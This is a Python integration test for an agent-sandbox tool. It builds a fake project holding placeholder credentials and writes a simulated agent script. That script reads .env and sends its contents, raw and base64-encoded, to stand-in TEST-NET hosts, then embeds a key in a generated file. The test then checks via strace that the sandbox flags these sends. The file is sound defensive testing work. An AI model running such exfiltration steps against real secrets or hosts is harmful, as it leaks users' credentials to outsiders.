"""End-to-end integration test with real subprocess execution.

Creates a temp project with sensitive files, launches a simulated agent
(a Python script) that reads .env and attempts network exfiltration,
uses strace to capture syscalls, and feeds them through the sandbox
enforcement layer to prove the full pipeline works.
"""

from __future__ import annotations

import os
import re
import subprocess
import sys
import tempfile
import textwrap
from dataclasses import dataclass, field
from pathlib import Path

from agent_sandbox.env_scanner import EnvironmentScanner
from agent_sandbox.sandbox import Sandbox

# ---------------------------------------------------------------------------
# Strace output parser
# ---------------------------------------------------------------------------

# openat(AT_FDCWD, "/path/to/file", O_RDONLY) = 3
_OPENAT_RE = re.compile(
    r'openat\((?:AT_FDCWD|\d+),\s*"([^"]+)",\s*([^)]+)\)\s*=\s*(\d+|-1)'
)
# read(3, "content...", 4096) = 42
_READ_RE = re.compile(r'read\((\d+),\s*"((?:[^"\\]|\\.)*)"(?:\.\.\.)?.*\)\s*=\s*(\d+|-1)')
# write(4, "content...", 42) = 42
_WRITE_RE = re.compile(r'write\((\d+),\s*"((?:[^"\\]|\\.)*)"(?:\.\.\.)?.*\)\s*=\s*(\d+|-1)')
# connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("1.2.3.4")}, 16) = 0
# Also matches: = -1 EINPROGRESS (non-blocking connect)
_CONNECT_RE = re.compile(
    r'connect\((\d+),\s*\{.*sin_port=htons\((\d+)\).*sin_addr=inet_addr\("([^"]+)"\).*\}\s*,\s*\d+\)\s*=\s*(-?\d+)'
)
# sendto(3, "data", 4, ...) = 4
_SENDTO_RE = re.compile(r'sendto\((\d+),\s*"((?:[^"\\]|\\.)*)"(?:\.\.\.)?.*\)\s*=\s*(\d+|-1)')
# pid prefix: [pid  1234]
_PID_RE = re.compile(r'^\[pid\s+(\d+)\]\s*')


@dataclass
class SyscallEvent:
    """A parsed syscall event from strace output."""

    pid: int
    syscall: str
    fd: int = -1
    path: str = ""
    data: str = ""
    addr: str = ""
    port: int = 0
    ret: int = 0


def parse_strace_line(line: str, default_pid: int = 0) -> SyscallEvent | None:
    """Parse a single strace output line into a SyscallEvent."""
    pid = default_pid
    pid_match = _PID_RE.match(line)
    if pid_match:
        pid = int(pid_match.group(1))
        line = line[pid_match.end():]

    m = _OPENAT_RE.search(line)
    if m:
        return SyscallEvent(
            pid=pid, syscall="openat", path=m.group(1),
            ret=int(m.group(3)) if m.group(3) != "-1" else -1,
            fd=int(m.group(3)) if m.group(3) != "-1" else -1,
        )

    m = _READ_RE.search(line)
    if m:
        return SyscallEvent(
            pid=pid, syscall="read", fd=int(m.group(1)),
            data=m.group(2), ret=int(m.group(3)) if m.group(3) != "-1" else -1,
        )

    m = _WRITE_RE.search(line)
    if m:
        return SyscallEvent(
            pid=pid, syscall="write", fd=int(m.group(1)),
            data=m.group(2), ret=int(m.group(3)) if m.group(3) != "-1" else -1,
        )

    m = _CONNECT_RE.search(line)
    if m:
        # Treat EINPROGRESS (-1) as a connect attempt (non-blocking socket)
        ret_val = int(m.group(4))
        return SyscallEvent(
            pid=pid, syscall="connect", fd=int(m.group(1)),
            port=int(m.group(2)), addr=m.group(3),
            ret=ret_val,
        )

    m = _SENDTO_RE.search(line)
    if m:
        return SyscallEvent(
            pid=pid, syscall="sendto", fd=int(m.group(1)),
            data=m.group(2), ret=int(m.group(3)) if m.group(3) != "-1" else -1,
        )

    return None


# ---------------------------------------------------------------------------
# Strace-based syscall monitor
# ---------------------------------------------------------------------------

@dataclass
class EnforcementResult:
    """Result of enforcing sandbox policy on traced syscalls."""

    events: list[SyscallEvent] = field(default_factory=list)
    taint_sources: list[str] = field(default_factory=list)
    would_block: list[dict[str, str]] = field(default_factory=list)
    file_reads: list[str] = field(default_factory=list)
    network_connects: list[str] = field(default_factory=list)
    network_sends: list[str] = field(default_factory=list)


def enforce_on_strace(
    strace_output: str,
    sandbox: Sandbox,
    project_root: str,
) -> EnforcementResult:
    """Parse strace output and apply sandbox enforcement.

    Returns what would have been blocked in a real enforcement scenario.
    """
    result = EnforcementResult()
    fd_to_path: dict[tuple[int, int], str] = {}
    connect_targets: dict[tuple[int, int], tuple[str, int]] = {}

    for line in strace_output.splitlines():
        event = parse_strace_line(line)
        if event is None:
            continue
        result.events.append(event)

        if event.syscall == "openat" and event.ret >= 0:
            fd_to_path[(event.pid, event.fd)] = event.path

            # Check if it's within the project
            if event.path.startswith(project_root):
                rel_path = os.path.relpath(event.path, project_root)
                if rel_path not in result.file_reads:
                    result.file_reads.append(rel_path)

        elif event.syscall == "read" and event.ret > 0:
            path = fd_to_path.get((event.pid, event.fd), "")
            if path.startswith(project_root):
                rel_path = os.path.relpath(path, project_root)
                data = _unescape_strace(event.data)
                # Track taint state before this read
                was_tainted = sandbox.taint.tainted
                sandbox.read_file(rel_path, data)
                # Only record as taint source if THIS read caused the taint
                if sandbox.taint.tainted and not was_tainted:
                    result.taint_sources.append(rel_path)

        elif event.syscall == "connect":
            # Accept both successful (0) and EINPROGRESS (-1) connects
            # Non-routable IPs return EINPROGRESS for non-blocking sockets
            if event.addr and event.port > 0:
                connect_targets[(event.pid, event.fd)] = (event.addr, event.port)
                result.network_connects.append(f"{event.addr}:{event.port}")

        elif event.syscall in ("write", "sendto") and event.ret > 0:
            target = connect_targets.get((event.pid, event.fd))
            if target:
                addr, port = target
                data = _unescape_strace(event.data)
                result.network_sends.append(f"{addr}:{port} [{len(data)} bytes]")

                # Check with sandbox
                allowed, reason = sandbox.check_send(addr, data)
                if not allowed:
                    result.would_block.append({
                        "target": f"{addr}:{port}",
                        "data_preview": data[:80],
                        "reason": reason,
                    })

    # For connects that happened but no data was sent (connection failed before send),
    # still check if the sandbox would have blocked the connection itself
    for (pid, fd), (addr, port) in connect_targets.items():
        # Check if tainted process tried to reach non-allowlisted host
        if sandbox.taint.tainted:
            allowed, reason = sandbox.check_send(addr, "")
            if not allowed and not any(
                b["target"] == f"{addr}:{port}" for b in result.would_block
            ):
                result.would_block.append({
                    "target": f"{addr}:{port}",
                    "data_preview": "(connection attempt from tainted process)",
                    "reason": reason,
                })

    return result


def _unescape_strace(s: str) -> str:
    """Unescape strace string representation."""
    return s.replace("\\n", "\n").replace("\\t", "\t").replace('\\"', '"').replace("\\\\", "\\")


# ---------------------------------------------------------------------------
# Test scenarios
# ---------------------------------------------------------------------------

def create_test_project(root: Path) -> None:
    """Create a test project with sensitive files."""
    (root / ".env").write_text(
        "DATABASE_URL=postgres://admin:s3cretP@ss@db.internal:5432/production\n"
        "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
        "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        "STRIPE_SECRET_KEY=sk_test_FAKE0000000000000000000000\n"
    )

    (root / "app.py").write_text(
        "from flask import Flask\n"
        "app = Flask(__name__)\n"
        "\n"
        "@app.route('/')\n"
        "def hello():\n"
        "    return 'Hello World'\n"
    )

    (root / "config.yaml").write_text(
        "database:\n"
        "  host: db.internal\n"
        "  port: 5432\n"
        "  name: production\n"
    )


def write_agent_script(script_path: Path, project_root: str) -> None:
    """Write a simulated agent Python script that reads .env and tries to exfiltrate."""
    script = textwrap.dedent(f"""\
        import os
        import socket
        import sys
        import json

        project = "{project_root}"

        # Step 1: Read the .env file (this should taint the process)
        env_path = os.path.join(project, ".env")
        with open(env_path) as f:
            env_content = f.read()
        print(f"Read .env: {{len(env_content)}} bytes", file=sys.stderr)

        # Step 2: Read a normal file (should not add new taint)
        app_path = os.path.join(project, "app.py")
        with open(app_path) as f:
            app_content = f.read()
        print(f"Read app.py: {{len(app_content)}} bytes", file=sys.stderr)

        # Step 3: Try to connect to an external host and send .env content
        # Using a non-routable IP so it fails fast but strace still captures the syscall
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect(("192.0.2.1", 80))  # TEST-NET-1, non-routable
            sock.sendall(env_content.encode())
            sock.close()
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            print(f"Network attempt (expected to fail): {{e}}", file=sys.stderr)

        # Step 4: Try to connect to another host and send encoded data
        import base64
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect(("192.0.2.2", 443))  # Another non-routable
            encoded = base64.b64encode(env_content.encode())
            sock.sendall(encoded)
            sock.close()
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            print(f"Encoded network attempt (expected to fail): {{e}}", file=sys.stderr)

        # Step 5: Write a file with secrets embedded (exfil via source code)
        output_path = os.path.join(project, "output.py")
        with open(output_path, "w") as f:
            f.write(f'API_KEY = "{{env_content.splitlines()[1].split("=", 1)[1]}}"\\n')
        print(f"Wrote output.py with embedded secret", file=sys.stderr)

        print("Agent done.", file=sys.stderr)
    """)
    script_path.write_text(script)


def run_test_scenario(
    name: str,
    project_root: Path,
    agent_script: Path,
    sandbox: Sandbox,
) -> EnforcementResult:
    """Run a test scenario: strace the agent and enforce policy."""
    strace_output_file = project_root / "strace.log"

    # Run the agent under strace
    cmd = [
        "strace",
        "-f",  # follow forks
        "-e", "trace=openat,read,write,connect,sendto",
        "-s", "512",  # capture up to 512 bytes of string args
        "-o", str(strace_output_file),
        sys.executable, str(agent_script),
    ]

    subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=30,
    )

    # Parse strace output
    strace_output = strace_output_file.read_text()
    return enforce_on_strace(strace_output, sandbox, str(project_root))


# ---------------------------------------------------------------------------
# Main test runner
# ---------------------------------------------------------------------------

def run_e2e_test() -> bool:
    """Run the full end-to-end test. Returns True if all checks pass."""
    print("=" * 70)
    print("END-TO-END INTEGRATION TEST: Real Agent Through Sandbox")
    print("=" * 70)

    with tempfile.TemporaryDirectory(prefix="sandbox-e2e-") as tmp:
        project_root = Path(tmp) / "project"
        project_root.mkdir()

        # Step 1: Create test project
        print("\n[1] Creating test project with sensitive files...")
        create_test_project(project_root)
        print(f"    Project at: {project_root}")
        for f in sorted(project_root.iterdir()):
            print(f"    {f.name} ({f.stat().st_size} bytes)")

        # Step 2: Run environment scanner
        print("\n[2] Running environment scanner...")
        scanner = EnvironmentScanner(str(project_root))
        manifest = scanner.scan()
        print(f"    Total files: {manifest.total_files}")
        print(f"    Sensitive files: {manifest.sensitive_files}")
        print(f"    Sensitive values: {len(manifest.sensitive_values)}")

        # Step 3: Create informed sandbox
        print("\n[3] Creating informed sandbox from manifest...")
        sandbox = Sandbox(manifest=manifest)
        print(f"    Informed mode: {sandbox.informed}")
        print(f"    Pre-indexed values: {len(manifest.sensitive_values)}")

        # Step 4: Write and strace the agent
        print("\n[4] Writing simulated agent script...")
        agent_script = Path(tmp) / "agent.py"
        write_agent_script(agent_script, str(project_root))

        print("\n[5] Running agent under strace with sandbox enforcement...")
        result = run_test_scenario("exfiltration_attempt", project_root, agent_script, sandbox)

        # Step 6: Report results
        print("\n[6] Results:")
        print(f"    Syscall events captured: {len(result.events)}")
        print(f"    Project files read: {result.file_reads}")
        print(f"    Taint sources: {result.taint_sources}")
        print(f"    Network connects: {result.network_connects}")
        print(f"    Network sends: {result.network_sends}")
        print(f"    Would-block actions: {len(result.would_block)}")

        if result.would_block:
            print("\n    Blocked exfiltration attempts:")
            for block in result.would_block:
                print(f"      Target: {block['target']}")
                print(f"      Reason: {block['reason']}")
                print(f"      Data:   {block['data_preview'][:60]}...")
                print()

        # Step 7: Verify expectations
        print("[7] Verification:")
        checks_passed = 0
        checks_total = 0

        def check(name: str, condition: bool) -> None:
            nonlocal checks_passed, checks_total
            checks_total += 1
            status = "PASS" if condition else "FAIL"
            if condition:
                checks_passed += 1
            print(f"    [{status}] {name}")

        check(
            "Scanner found .env as sensitive",
            ".env" in manifest.sensitive_files,
        )
        check(
            "Scanner found AWS key",
            any("AKIA" in v for v in manifest.sensitive_values),
        )
        check(
            "Strace captured file reads",
            len(result.file_reads) > 0,
        )
        check(
            ".env was read by agent",
            ".env" in result.file_reads,
        )
        check(
            "Process became tainted after reading .env",
            sandbox.taint.tainted,
        )
        check(
            ".env is a taint source",
            ".env" in result.taint_sources,
        )
        check(
            "Network connections were attempted",
            len(result.network_connects) > 0,
        )
        check(
            "Sandbox would block exfiltration",
            len(result.would_block) > 0,
        )

        # Check file changes
        output_py = project_root / "output.py"
        if output_py.exists():
            content = output_py.read_text()
            has_secret = "AKIAIOSFODNN7EXAMPLE" in content
            check(
                "Agent wrote embedded secret to output.py",
                has_secret,
            )
            # The sandbox should detect this via LSH if the file were sent
            allowed, reason = sandbox.check_send("api.github.com", content)
            check(
                "Sandbox would block sending output.py content",
                not allowed,
            )

        print(f"\n    Result: {checks_passed}/{checks_total} checks passed")

        all_passed = checks_passed == checks_total
        print(f"\n{'=' * 70}")
        if all_passed:
            print("ALL CHECKS PASSED - End-to-end pipeline verified!")
        else:
            print(f"SOME CHECKS FAILED ({checks_total - checks_passed} failures)")
        print(f"{'=' * 70}")

        return all_passed


if __name__ == "__main__":
    success = run_e2e_test()
    sys.exit(0 if success else 1)
